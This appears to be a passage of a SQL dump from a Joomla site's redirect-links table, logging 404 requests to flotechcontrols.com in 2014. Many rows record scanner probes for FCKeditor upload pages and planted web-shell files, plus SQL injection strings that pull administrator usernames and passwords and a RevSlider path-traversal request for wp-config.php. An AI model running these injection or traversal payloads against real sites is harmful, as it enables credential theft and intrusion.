(619, 'http://www.flotechcontrols.com/tmp/php.class.php?token=up', '', '', '', 1, 0, '2014-06-16 00:55:37', '0000-00-00 00:00:00'),
(620, 'http://flotechcontrols.com/images/stories/pageinfo.php?ssp=RfVbHu', '', '', '', 1, 0, '2014-06-19 03:20:49', '0000-00-00 00:00:00'),
(621, 'http://flotechcontrols.com/libraries/joomla/user/index.php?search=hello', '', '', '', 1, 0, '2014-06-19 06:03:20', '0000-00-00 00:00:00'),
(622, 'http://flotechcontrols.com/modules/mod_search/tmpl/index.php?search=hello', '', '', '', 1, 0, '2014-06-19 07:13:12', '0000-00-00 00:00:00'),
(623, 'http://flotechcontrols.com/plugins/system/index.php?search=hello', '', '', '', 1, 0, '2014-06-19 07:13:12', '0000-00-00 00:00:00'),
(624, 'http://www.flotechcontrols.com/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-20 06:01:01', '0000-00-00 00:00:00'),
(625, 'http://www.flotechcontrols.com/public/js/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-20 08:21:57', '0000-00-00 00:00:00'),
(626, 'http://www.flotechcontrols.com/includes/editors/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-20 08:54:55', '0000-00-00 00:00:00'),
(627, 'http://www.flotechcontrols.com/cms/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 09:03:08', '0000-00-00 00:00:00'),
(628, 'http://www.flotechcontrols.com/webeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 11:53:32', '0000-00-00 00:00:00'),
(629, 'http://www.flotechcontrols.com/js/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-20 12:49:10', '0000-00-00 00:00:00'),
(630, 'http://www.flotechcontrols.com/fckeditor1/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 14:42:34', '0000-00-00 00:00:00'),
(631, 'http://www.flotechcontrols.com/admin/system/editor/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-06-20 16:13:10', '0000-00-00 00:00:00'),
(632, 'http://www.flotechcontrols.com/admin/editors/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-20 16:33:27', '0000-00-00 00:00:00'),
(633, 'http://www.flotechcontrols.com/mods/ckeditor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 16:41:59', '0000-00-00 00:00:00'),
(634, 'http://www.flotechcontrols.com/webmanage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-20 17:45:36', '0000-00-00 00:00:00'),
(635, 'http://www.flotechcontrols.com/edit/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-06-20 18:15:49', '0000-00-00 00:00:00'),
(636, 'http://www.flotechcontrols.com:80/online/index.php', '', '', '', 1, 0, '2014-06-20 18:16:22', '0000-00-00 00:00:00'),
(637, 'http://www.flotechcontrols.com/js/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-06-20 18:23:06', '0000-00-00 00:00:00'),
(638, 'http://www.flotechcontrols.com/administrator/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 19:42:20', '0000-00-00 00:00:00'),
(639, 'http://www.flotechcontrols.com/fckeditor_ap/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 21:04:49', '0000-00-00 00:00:00'),
(640, 'http://www.flotechcontrols.com/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 21:48:45', '0000-00-00 00:00:00'),
(641, 'http://www.flotechcontrols.com/webeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-20 21:48:50', '0000-00-00 00:00:00'),
(642, 'http://www.flotechcontrols.com/fckeditor/editor/fckdialog.html', '', '', '', 1, 0, '2014-06-20 21:50:25', '0000-00-00 00:00:00'),
(643, 'http://www.flotechcontrols.com/webeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-20 21:59:09', '0000-00-00 00:00:00'),
(644, 'http://www.flotechcontrols.com/admin/fckeditor1/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-20 22:15:21', '0000-00-00 00:00:00'),
(645, 'http://flotechcontrols.com/tmp/index_new.php?pw=oscar', '', '', '', 1, 0, '2014-06-21 00:52:15', '0000-00-00 00:00:00'),
(646, 'http://flotechcontrols.com/tmp/configuration.php?pw=oscar', '', '', '', 1, 0, '2014-06-21 04:49:55', '0000-00-00 00:00:00'),
(647, 'http://flotechcontrols.com/tmp/al.php', '', '', '', 1, 0, '2014-06-21 10:46:15', '0000-00-00 00:00:00'),
(648, 'http://flotechcontrols.com/tmp/xml.class.php?cmd=cont', '', '', '', 1, 0, '2014-06-21 22:48:02', '0000-00-00 00:00:00'),
(649, 'http://www.flotechcontrols.com/path/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-06-23 08:27:17', '0000-00-00 00:00:00'),
(650, 'http://www.flotechcontrols.com/admin/fckeditor_ap/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-23 10:38:10', '0000-00-00 00:00:00'),
(651, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-23 13:28:06', '0000-00-00 00:00:00'),
(652, 'http://www.flotechcontrols.com/public/js/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-23 15:43:57', '0000-00-00 00:00:00'),
(653, 'http://flotechcontrols.com/plugins/content/i.php', '', '', '', 1, 0, '2014-06-23 17:10:55', '0000-00-00 00:00:00'),
(654, 'http://flotechcontrols.com/images/stories/gif1.php', '', '', '', 1, 0, '2014-06-23 23:34:03', '0000-00-00 00:00:00'),
(655, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-06-24 02:04:57', '0000-00-00 00:00:00'),
(656, 'http://flotechcontrols.com/admin/administrators.php/login.php?action=insert', '', '', '', 1, 0, '2014-06-24 03:49:36', '0000-00-00 00:00:00'),
(657, 'http://flotechcontrols.com/admin/login.php?action=process', '', '', '', 1, 0, '2014-06-24 03:49:37', '0000-00-00 00:00:00'),
(658, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-24 04:35:40', '0000-00-00 00:00:00'),
(659, 'http://www.flotechcontrols.com/editor/editor/filemanager/browser/default/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-24 04:35:41', '0000-00-00 00:00:00'),
(660, 'http://www.flotechcontrols.com/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-06-24 21:49:52', '0000-00-00 00:00:00'),
(661, 'http://www.flotechcontrols.com/bbadmin/editors/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-25 09:13:19', '0000-00-00 00:00:00'),
(662, 'http://www.flotechcontrols.com/fckeditor/editor/fckeditor.original.html', '', '', '', 1, 0, '2014-06-25 17:06:36', '0000-00-00 00:00:00'),
(663, 'http://www.flotechcontrols.com/assets/index.html', '', '', '', 1, 0, '2014-06-27 01:38:51', '0000-00-00 00:00:00'),
(664, 'http://www.flotechcontrols.com/webmanage/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-27 03:43:42', '0000-00-00 00:00:00'),
(665, 'http://www.flotechcontrols.com/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-27 08:24:14', '0000-00-00 00:00:00'),
(666, 'http://www.flotechcontrols.com/admin/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-27 09:23:52', '0000-00-00 00:00:00'),
(667, 'http://www.flotechcontrols.com/login/editors/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-27 12:32:35', '0000-00-00 00:00:00'),
(668, 'http://www.flotechcontrols.com/manage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-28 00:31:02', '0000-00-00 00:00:00'),
(669, 'http://www.flotechcontrols.com/public/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-28 00:40:44', '0000-00-00 00:00:00'),
(670, 'http://www.flotechcontrols.com/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-28 01:27:50', '0000-00-00 00:00:00'),
(671, 'http://www.flotechcontrols.com/administrator/fckeditor1/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-28 11:06:30', '0000-00-00 00:00:00'),
(672, 'http://flotechcontrols.com/modules/mod_acepolls/ssp.php', '', '', '', 1, 0, '2014-07-01 01:41:08', '0000-00-00 00:00:00'),
(673, 'http://flotechcontrols.com/components/com_content/article.php?sk=NGFcD0Mn1u&cm=st', '', '', '', 1, 0, '2014-07-01 04:18:13', '0000-00-00 00:00:00'),
(674, 'http://flotechcontrols.com/components/com_content/views/article/articie.php', '', '', '', 1, 0, '2014-07-01 06:14:41', '0000-00-00 00:00:00'),
(675, 'http://flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-07-01 13:33:14', '0000-00-00 00:00:00'),
(676, 'http://flotechcontrols.com/editor/filemanager/browser/default/connectors/test.html', '', 'http://flotechcontrols.com/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-07-01 13:33:15', '0000-00-00 00:00:00'),
(677, 'http://flotechcontrols.com/manage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://flotechcontrols.com/manage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-07-01 13:33:17', '0000-00-00 00:00:00');
INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(678, 'http://flotechcontrols.com/phpmotion/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://flotechcontrols.com/phpmotion/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-07-01 13:33:18', '0000-00-00 00:00:00'),
(679, 'http://flotechcontrols.com/wp-content/plugins/editormonkey/fckeditor/editor/filemanager/upload/test.html', '', 'http://flotechcontrols.com/wp-content/plugins/editormonkey/fckeditor/editor/filemanager/upload/test.html', '', 1, 0, '2014-07-01 13:33:20', '0000-00-00 00:00:00'),
(680, 'http://www.flotechcontrols.com/%e8%81%bd2014-06-18%e8%81%bd', '', '', '', 1, 0, '2014-07-02 09:58:17', '0000-00-00 00:00:00'),
(681, 'http://flotechcontrols.com/zongg/', '', 'http://www.baidu.com', '', 1, 0, '2014-07-04 13:49:08', '0000-00-00 00:00:00'),
(682, 'http://flotechcontrols.com/message.html', '', 'http://www.baidu.com', '', 1, 0, '2014-07-04 13:49:36', '0000-00-00 00:00:00'),
(683, 'http://flotechcontrols.com/board/default/board_view.html', '', 'http://www.baidu.com', '', 1, 0, '2014-07-04 13:49:36', '0000-00-00 00:00:00'),
(684, 'http://flotechcontrols.com/templates/default/auction_detail.html', '', 'http://www.baidu.com', '', 1, 0, '2014-07-04 13:49:37', '0000-00-00 00:00:00'),
(685, 'http://flotechcontrols.com/modules/mod_joomla_wso/mod_joomla_wso.php', '', '', '', 1, 0, '2014-07-07 12:50:37', '0000-00-00 00:00:00'),
(686, 'http://flotechcontrols.com/plugins/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/plugins/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-07-07 18:00:29', '0000-00-00 00:00:00'),
(687, 'http://flotechcontrols.com/plugins/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/plugins/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-07-07 18:00:30', '0000-00-00 00:00:00'),
(688, 'http://flotechcontrols.com/media/com_uniterevolution/assets/rs', '', '', '', 1, 0, '2014-07-08 12:41:07', '0000-00-00 00:00:00'),
(689, 'http://flotechcontrols.com/includes/router.php', '', '', '', 1, 0, '2014-07-08 22:28:31', '0000-00-00 00:00:00'),
(690, 'http://flotechcontrols.com/index.php/weblinks-categories?id=%5C', '', 'http://flotechcontrols.com/index.php/weblinks-categories?id=%5C', '', 1, 0, '2014-07-10 11:31:37', '0000-00-00 00:00:00'),
(691, 'http://flotechcontrols.com/index.php?option=com_content&task=blogcategory&id=60&Itemid=99999%20UNION%20SELECT+1,concat%280x3a,0x3a,0x3a,0x3a,username,0x3a,password,0x3a,usertype,0x3b%29,3,4,5%20from%20jos_users%20where%20usertype%3D%27Super%20Administrato', '', 'http://flotechcontrols.com/index.php?option=com_content&task=blogcategory&id=60&Itemid=99999%20UNION%20SELECT+1,concat%280x3a,0x3a,0x3a,0x3a,username,', '', 1, 0, '2014-07-10 23:01:35', '0000-00-00 00:00:00'),
(692, 'http://flotechcontrols.com/libraries/joomla/application/component/helper.php', '', '', '', 1, 0, '2014-07-11 00:14:40', '0000-00-00 00:00:00'),
(693, 'http://flotechcontrols.com/modules/mod_login/cache.php', '', '', '', 1, 0, '2014-07-11 10:42:00', '0000-00-00 00:00:00'),
(694, 'http://flotechcontrols.com/administrator/components/com_admin/index.php', '', '', '', 1, 0, '2014-07-14 11:45:03', '0000-00-00 00:00:00'),
(695, 'http://flotechcontrols.com/components/com_artforms/version.php?lala', '', '', '', 1, 0, '2014-07-15 06:06:54', '0000-00-00 00:00:00'),
(696, 'http://flotechcontrols.com/wordpress', '', 'http://flotechcontrols.com/wordpress', '', 1, 0, '2014-07-28 03:21:17', '0000-00-00 00:00:00'),
(697, 'http://www.flotechcontrols.com/wp-content/uploads/ftp.php', '', '', '', 1, 0, '2014-08-04 07:07:01', '0000-00-00 00:00:00'),
(698, 'http://www.flotechcontrols.com/exchange', '', '', '', 1, 0, '2014-08-05 08:22:57', '0000-00-00 00:00:00'),
(699, 'http://www.flotechcontrols.com/%e8%81%bd2014-07-14%e8%81%bd', '', '', '', 1, 0, '2014-08-05 12:06:57', '0000-00-00 00:00:00'),
(700, 'http://flotechcontrols.com/tmp/rss.php?baks', '', '', '', 1, 0, '2014-08-13 01:02:56', '0000-00-00 00:00:00'),
(701, 'http://www.flotechcontrols.com/about.htm', '', '', '', 1, 0, '2014-08-18 03:35:17', '0000-00-00 00:00:00'),
(702, 'http://flotechcontrols.com/xmlrpc.php', '', 'https://www.google.com/search?q=flotechcontrols', '', 1, 0, '2014-08-28 23:22:29', '0000-00-00 00:00:00'),
(703, 'http://www.flotechcontrols.com/editors/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-09-01 23:09:50', '0000-00-00 00:00:00'),
(704, 'http://www.flotechcontrols.com/admin/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-09-01 23:09:52', '0000-00-00 00:00:00'),
(705, 'http://flotechcontrols.com/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:12', '0000-00-00 00:00:00'),
(706, 'http://flotechcontrols.com/FCKeditor/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/FCKeditor/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:13', '0000-00-00 00:00:00'),
(707, 'http://flotechcontrols.com/FCK/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/FCK/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:13', '0000-00-00 00:00:00'),
(708, 'http://flotechcontrols.com/admin/FCKeditor/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/admin/FCKeditor/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:14', '0000-00-00 00:00:00'),
(709, 'http://flotechcontrols.com/manage/FCKeditor/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/manage/FCKeditor/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:15', '0000-00-00 00:00:00'),
(710, 'http://flotechcontrols.com/editor/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/editor/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:15', '0000-00-00 00:00:00'),
(711, 'http://flotechcontrols.com/editor/FCKeditor/editor/dialog/fck_about.html', '', 'http://flotechcontrols.com/editor/FCKeditor/editor/dialog/fck_about.html', '', 1, 0, '2014-09-04 10:44:16', '0000-00-00 00:00:00'),
(712, 'http://flotechcontrols.com/bitrix/admin/', '', '', '', 1, 0, '2014-09-06 03:24:09', '0000-00-00 00:00:00'),
(713, 'http://flotechcontrols.com/bitrix/', '', 'http://www.bing.com/search?q=flotechcontrols.com&qs=n&form=QBRE&pq=flotechcontrols.com&sc=0-0&sp=-1&sk=&cvid=0346dcde9j574c26b6b622k7759h14g3', '', 1, 0, '2014-09-06 07:05:13', '0000-00-00 00:00:00'),
(714, 'http://www.flotechcontrols.com/templates/flotech_followon/css/priney%3C/a%3E%3C/li%3E%3Cli%20id=', '', 'http://www.flotechcontrols.com/products/birkett', '', 1, 0, '2014-09-10 09:25:45', '0000-00-00 00:00:00'),
(715, 'http://www.flotechcontrols.com/admin/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-09-11 01:27:43', '0000-00-00 00:00:00'),
(716, 'http://www.flotechcontrols.com/index.htm', '', '', '', 1, 0, '2014-09-11 04:57:50', '0000-00-00 00:00:00'),
(717, 'http://www.flotechcontrols.com/index.html', '', '', '', 1, 0, '2014-09-11 04:57:51', '0000-00-00 00:00:00'),
(718, 'http://www.flotechcontrols.com/welcome.htm', '', '', '', 1, 0, '2014-09-11 04:57:52', '0000-00-00 00:00:00'),
(719, 'http://www.flotechcontrols.com/welcome.html', '', '', '', 1, 0, '2014-09-11 04:57:52', '0000-00-00 00:00:00'),
(720, 'http://www.flotechcontrols.com/home.htm', '', '', '', 1, 0, '2014-09-11 04:57:52', '0000-00-00 00:00:00'),
(721, 'http://www.flotechcontrols.com/home.html', '', '', '', 1, 0, '2014-09-11 04:57:52', '0000-00-00 00:00:00'),
(722, 'http://www.flotechcontrols.com/default.htm', '', '', '', 1, 0, '2014-09-11 04:57:54', '0000-00-00 00:00:00'),
(723, 'http://www.flotechcontrols.com/default.html', '', '', '', 1, 0, '2014-09-11 04:57:54', '0000-00-00 00:00:00'),
(724, 'http://www.flotechcontrols.com/main.htm', '', '', '', 1, 0, '2014-09-11 04:57:55', '0000-00-00 00:00:00'),
(725, 'http://www.flotechcontrols.com/main.html', '', '', '', 1, 0, '2014-09-11 04:57:56', '0000-00-00 00:00:00'),
(726, 'http://www.flotechcontrols.com/default.php', '', '', '', 1, 0, '2014-09-11 04:57:58', '0000-00-00 00:00:00'),
(727, 'http://www.flotechcontrols.com/home.php', '', '', '', 1, 0, '2014-09-11 04:57:58', '0000-00-00 00:00:00'),
(728, 'http://FLOTECHCONTROLS.COM/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', '', '', '', 1, 0, '2014-09-11 17:47:06', '0000-00-00 00:00:00'),
(729, 'http://flotechcontrols.com/index.php/on-air-mainmenu/podcasts-mainmenu-58', '', '', '', 1, 0, '2014-09-12 09:03:35', '0000-00-00 00:00:00'),
(730, 'http://flotechcontrols.com/zivot-v-obci/clanok/oznam-kniznice-', '', '', '', 1, 0, '2014-09-12 11:15:31', '0000-00-00 00:00:00'),
(731, 'http://www.flotechcontrols.com/2014/09/09/taller-critica/', '', '', '', 1, 0, '2014-09-12 11:18:00', '0000-00-00 00:00:00'),
(732, 'http://FLOTECHCONTROLS.COM/include/version.php', '', '', '', 1, 0, '2014-09-12 16:10:07', '0000-00-00 00:00:00'),
(733, 'http://FLOTECHCONTROLS.COM/cart/include/version.php', '', '', '', 1, 0, '2014-09-12 16:10:07', '0000-00-00 00:00:00'),
(734, 'http://FLOTECHCONTROLS.COM/xcart/include/version.php', '', '', '', 1, 0, '2014-09-12 16:10:08', '0000-00-00 00:00:00'),
(735, 'http://FLOTECHCONTROLS.COM/store/include/version.php', '', '', '', 1, 0, '2014-09-12 16:10:09', '0000-00-00 00:00:00'),
(736, 'http://FLOTECHCONTROLS.COM/shop/include/version.php', '', '', '', 1, 0, '2014-09-12 16:10:09', '0000-00-00 00:00:00'),
(737, 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', '', '', '', 1, 0, '2014-09-12 16:36:57', '0000-00-00 00:00:00'),
(738, 'http://www.flotechcontrols.com/category/blog/', '', '', '', 1, 0, '2014-09-13 02:18:48', '0000-00-00 00:00:00'),
(739, 'http://flotechcontrols.com/mp-prodotto/i-nostri-prodotti', '', '', '', 1, 0, '2014-09-14 16:13:50', '0000-00-00 00:00:00'),
(740, 'http://flotechcontrols.com/mp-link-e-download/link-e-download', '', '', '', 1, 0, '2014-09-14 19:18:00', '0000-00-00 00:00:00'),
(741, 'http://www.flotechcontrols.com/category/press/', '', '', '', 1, 0, '2014-09-15 23:34:58', '0000-00-00 00:00:00'),
(742, 'http://flotechcontrols.com/password_forgotten.php', '', '', '', 1, 0, '2014-09-16 13:04:54', '0000-00-00 00:00:00'),
(743, 'http://FLOTECHCONTROLS.COM/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', '', '', '', 1, 0, '2014-09-16 17:46:50', '0000-00-00 00:00:00'),
(744, 'http://www.flotechcontrols.com/admin/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:11', '0000-00-00 00:00:00'),
(745, 'http://www.flotechcontrols.com/FCKeditor/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(746, 'http://www.flotechcontrols.com/admin/editors/fckeditor/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(747, 'http://www.flotechcontrols.com/admin/ckeditor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(748, 'http://www.flotechcontrols.com/editors/fckeditor/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(749, 'http://www.flotechcontrols.com/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(750, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:13', '0000-00-00 00:00:00'),
(751, 'http://www.flotechcontrols.com/ckeditor/filemanager/', '', '', '', 1, 0, '2014-09-17 15:28:14', '0000-00-00 00:00:00'),
(752, 'http://flotechcontrols.com/old/wp-admin/', '', '', '', 1, 0, '2014-09-19 05:22:11', '0000-00-00 00:00:00'),
(753, 'http://FLOTECHCONTROLS.COM/order/include/version.php', '', '', '', 1, 0, '2014-09-23 11:12:07', '0000-00-00 00:00:00'),
(754, 'http://FLOTECHCONTROLS.COM/market/include/version.php', '', '', '', 1, 0, '2014-09-23 11:12:08', '0000-00-00 00:00:00'),
(755, 'http://FLOTECHCONTROLS.COM/buy/include/version.php', '', '', '', 1, 0, '2014-09-23 11:12:08', '0000-00-00 00:00:00'),
(756, 'http://flotechcontrols.com/administrator/components/com_contact/pp1.php', '', '', '', 1, 0, '2014-09-26 00:39:31', '0000-00-00 00:00:00'),
(757, 'http://flotechcontrols.com/cache/pp1.php', '', '', '', 1, 0, '2014-09-26 03:50:56', '0000-00-00 00:00:00'),
(758, 'http://flotechcontrols.com/blog', '', 'http://flotechcontrols.com/blog', '', 1, 0, '2014-09-26 16:34:19', '0000-00-00 00:00:00'),
(759, 'http://flotechcontrols.com/tmp/in.php?ari=ari', '', '', '', 1, 0, '2014-09-27 03:37:11', '0000-00-00 00:00:00'),
(760, 'http://flotechcontrols.com/modules/mod_main_wrap/mod_main_wrap.php', '', '', '', 1, 0, '2014-09-28 02:15:23', '0000-00-00 00:00:00'),
(761, 'http://flotechcontrols.com/components/com_contact/core.php', '', '', '', 1, 0, '2014-09-28 03:11:18', '0000-00-00 00:00:00'),
(762, 'http://www.flotechcontrols.com/index.php/admin/', '', '', '', 1, 0, '2014-09-28 09:20:42', '0000-00-00 00:00:00'),
(763, 'http://www.flotechcontrols.com/downloader/index.php', '', '', '', 1, 0, '2014-09-28 09:20:43', '0000-00-00 00:00:00'),
(764, 'http://flotechcontrols.com/index.php?option=com_content&task=blogcategory&id=60&Itemid=99999+UNION+SELECT+1,concat(0x23,0x25,username,0x3a,password,0x1e,0x3a,usertype,0x25,0x23),3,4,5+FROM+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72-', '', '', '', 1, 0, '2014-09-28 15:50:20', '0000-00-00 00:00:00'),
(765, 'http://flotechcontrols.com/index.php/admin/', '', '', '', 1, 0, '2014-09-28 18:36:18', '0000-00-00 00:00:00'),
(766, 'http://flotechcontrols.com/downloader/index.php', '', '', '', 1, 0, '2014-09-28 18:36:19', '0000-00-00 00:00:00'),
(767, 'http://flotechcontrols.com/modules/mod_araticclhess/mod_araticclhess.php', '', '', '', 1, 0, '2014-09-29 04:05:57', '0000-00-00 00:00:00'),
(768, 'http://flotechcontrols.com/modules/mod_system/mod_system.php', '', '', '', 1, 0, '2014-09-29 04:54:05', '0000-00-00 00:00:00'),
(769, 'http://flotechcontrols.com//shop/password_forgotten.php', '', '', '', 1, 0, '2014-10-01 05:53:26', '0000-00-00 00:00:00'),
(770, 'http://flotechcontrols.com//catalog/password_forgotten.php', '', '', '', 1, 0, '2014-10-01 05:53:26', '0000-00-00 00:00:00'),
(771, 'http://flotechcontrols.com//oscommerce/password_forgotten.php', '', '', '', 1, 0, '2014-10-01 05:53:26', '0000-00-00 00:00:00'),
(772, 'http://flotechcontrols.com//store/password_forgotten.php', '', '', '', 1, 0, '2014-10-01 06:06:22', '0000-00-00 00:00:00'),
(773, 'http://flotechcontrols.com/tmp/cache.php', '', '', '', 1, 0, '2014-10-03 05:11:34', '0000-00-00 00:00:00'),
(774, 'http://www.flotechcontrols.com/xmlrpc.php', '', '', '', 1, 0, '2014-10-04 07:28:00', '0000-00-00 00:00:00'),
(775, 'http://www.flotechcontrols.com/%23', '', 'http://www.flotechcontrols.com', '', 1, 0, '2014-10-04 15:15:29', '0000-00-00 00:00:00'),
(776, 'http://flotechcontrols.com/media/mod.php', '', '', '', 1, 0, '2014-10-05 02:38:39', '0000-00-00 00:00:00'),
(777, 'http://flotechcontrols.com/modules/mod_artshop/mod_artshop.php', '', '', '', 1, 0, '2014-10-06 01:43:21', '0000-00-00 00:00:00'),
(778, 'http://flotechcontrols.com/modules/mod_araticlhessess/mod_araticlhessess.php', '', '', '', 1, 0, '2014-10-06 02:55:38', '0000-00-00 00:00:00'),
(779, 'http://www.flotechcontrols.com/utility/convert/index.php', '', '', '', 1, 0, '2014-10-06 16:41:37', '0000-00-00 00:00:00'),
(780, 'http://www.flotechcontrols.com/admin/', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2014-10-08 17:39:53', '0000-00-00 00:00:00'),
(781, 'http://flotechcontrols.com/images/ccs.php?input', '', '', '', 1, 0, '2014-10-09 23:17:29', '0000-00-00 00:00:00'),
(782, 'http://flotechcontrols.com/administrator/components/com_cpanel/views/cpanel/ccs.php?input', '', '', '', 1, 0, '2014-10-10 00:07:29', '0000-00-00 00:00:00'),
(783, 'http://flotechcontrols.com/components/com_content/views/article/tmpl/ccs.php?input', '', '', '', 1, 0, '2014-10-10 05:47:28', '0000-00-00 00:00:00'),
(784, 'http://flotechcontrols.com/libraries/phputf8/native/index.html.php', '', '', '', 1, 0, '2014-10-11 01:24:18', '0000-00-00 00:00:00'),
(785, 'http://flotechcontrols.com/images/jupload.php', '', '', '', 1, 0, '2014-10-11 01:47:00', '0000-00-00 00:00:00'),
(786, 'http://flotechcontrols.com/modules/mod_WeBAntivirus/mod_WeBAntivirus.php', '', '', '', 1, 0, '2014-10-11 21:51:34', '0000-00-00 00:00:00'),
(787, 'http://www.flotechcontrols.com/%2BTemperature%2BControl%2BLtd&as_qdr=all&filter=0&num=100&complete=0&cr=countryAU&gws_rd=ssl&hl=en&&ct=clnk', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2014-10-12 15:23:00', '0000-00-00 00:00:00'),
(788, 'http://flotechcontrols.com/images/fix.php', '', '', '', 1, 0, '2014-10-13 00:30:33', '0000-00-00 00:00:00'),
(789, 'http://www.flotechcontrols.com/kcfinder/browse.php', '', '', '', 1, 0, '2014-10-13 02:45:42', '0000-00-00 00:00:00'),
(790, 'http://www.flotechcontrols.com/fckeditor/editor/filemanager/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:46:23', '0000-00-00 00:00:00'),
(791, 'http://www.flotechcontrols.com/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:46:44', '0000-00-00 00:00:00'),
(792, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:47:25', '0000-00-00 00:00:00'),
(793, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:47:46', '0000-00-00 00:00:00'),
(794, 'http://www.flotechcontrols.com/ckeditor/ckfinder/core/connector/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:48:06', '0000-00-00 00:00:00'),
